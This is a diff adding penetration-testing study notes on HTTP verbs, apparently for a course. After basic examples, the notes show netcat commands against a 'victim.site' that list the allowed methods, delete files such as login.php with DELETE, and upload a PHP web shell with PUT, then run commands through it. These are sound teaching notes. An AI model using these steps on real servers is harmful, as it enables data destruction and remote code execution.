@@ -1,0 +1,50 @@
+#HTTP Verbs
+
+Common methods:
+GET, POST, HEAD, PUT, DELETE
+#GET
+ex: GET /page.php HTTP/1.1 
+used to request a resource
+can also be used to pass arguments to web server.
+ex: GET /page.php?course=PTS HTTP/1.1
+#POST
+submit HTML form data. 
+ex:
+POST /login.php HTTP/1.1
+HOST: www.example.site
+username=john&password=mypass
+#HEAD is similar to get. returns headers of response w/o response body.
+#PUT is used to upload a file to the server.
+Ex:
+PUT /path/to/destination HTTP/1.1
+Host: www.example.site
+<PUT data>
+#DELETE removes a file from the server. can lead to DoS and data loss
+DELETE /path/to/destination HTTP/1.1
+host: www.example.site
+#OPTIONS queries server for enabled HTTP verbs
+OPTIONS / HTTP/1.1
+Host: www
+#REST APIs specific web apps that rely on almost all HTTP verbs
+- PUT for saving data & not files
+#Enumerate with OPTIONS message using netcat
+$nc victim.site 80
+OPTIONS /HTTP/1.0
+
+Allow: GET,HEAD,POST,PUT,DELETE,OPTIONS
+#Exploiting DELETE (specify path)
+nc victim.site 80
+DELETE /path/to/resource.txt HTTP/1.0
+#Exploiting login page with DELETE for ex.
+DELETE /login.php HTTP/1.0
+#Exploiting PUT (have to know size of payload file. check size with wc -m payload.php 
+wc -m payload.php counts how many bytes long the file is.
+#Uploading PHP Shell with PUT
+use shell.php in browser.
+URL:victim.site/shell.php?cmd=ls
+URL:victim.site/shell.php?cmd=echo 'test string' > /tmp/testfile
+#Uploading the shell with PUT
+$nc victim.site 80
+PUT /payload.php HTTP/1.0
+Content-type: text/html
+Content-length: 136 (and paste the shell.php script)
